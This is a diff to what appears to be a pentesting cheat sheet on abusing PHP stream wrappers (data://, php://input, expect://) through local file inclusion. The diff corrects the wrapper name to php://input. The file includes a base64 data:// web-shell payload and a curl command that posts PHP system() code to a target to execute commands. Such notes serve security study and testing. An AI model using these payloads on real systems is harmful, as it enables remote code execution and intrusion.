@@ -10,7 +10,7 @@
 * Three primary wrappers:
 
   * `data://`
-  * `input://`
+  * `php://input`
   * `expect://`
 * Wrappers behave differently depending on PHP configuration.
 
@@ -57,16 +57,16 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
 
 ---
 
-## input:// Wrapper
+## php://input Wrapper
 
-* Executes raw POST body as PHP code.
+* Executes the raw POST body as PHP code when included via LFI.
 * **Requires:** `allow_url_include = On`
-* PHP code is supplied in POST; command via GET.
+* PHP code is supplied in the POST body; command via GET.
 
 ### Example
 
 ```
-curl -X POST "http://target/?cmd=id" \
+curl -X POST "http://target/?page=php://input&cmd=id" \
      --data '<?php system($_GET["cmd"]); ?>'
 ```
 
